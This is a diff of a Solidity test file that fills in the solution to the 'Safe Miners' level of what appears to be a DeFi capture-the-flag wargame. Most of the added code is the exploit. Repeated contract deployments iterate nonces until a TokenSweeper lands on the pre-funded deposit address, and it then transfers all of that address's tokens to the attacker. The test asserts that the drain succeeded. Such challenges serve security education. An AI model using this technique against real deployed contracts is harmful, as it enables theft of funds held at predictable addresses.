@@ -38,13 +38,16 @@ contract SafeMiners is Test {
     }
 
     function testExploit() public {
-        /**
-         * EXPLOIT START *
-         */
+        vm.startPrank(attacker);
 
-        /**
-         * EXPLOIT END *
-         */
+        for (uint256 i = 0; i < 500;) {
+            new SafeMinersAttack(attacker, dvt, 500);
+            unchecked {
+                i++;
+            }
+        }
+
+        vm.stopPrank();
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
     }
@@ -56,5 +59,22 @@ contract SafeMiners is Test {
         // The attacker took all tokens available in the deposit address
         assertEq(dvt.balanceOf(DEPOSIT_ADDRESS), 0);
         assertEq(dvt.balanceOf(attacker), DEPOSIT_TOKEN_AMOUNT);
+    }
+}
+
+contract SafeMinersAttack {
+    constructor(address attacker, DamnValuableToken token, uint256 nonces) {
+        for (uint256 idx; idx < nonces; idx++) {
+            new TokenSweeper(attacker, token);
+        }
+    }
+}
+
+contract TokenSweeper {
+    constructor(address attacker, DamnValuableToken token) {
+        uint256 balance = token.balanceOf(address(this));
+        if (balance > 0) {
+            token.transfer(attacker, balance);
+        }
     }
 }
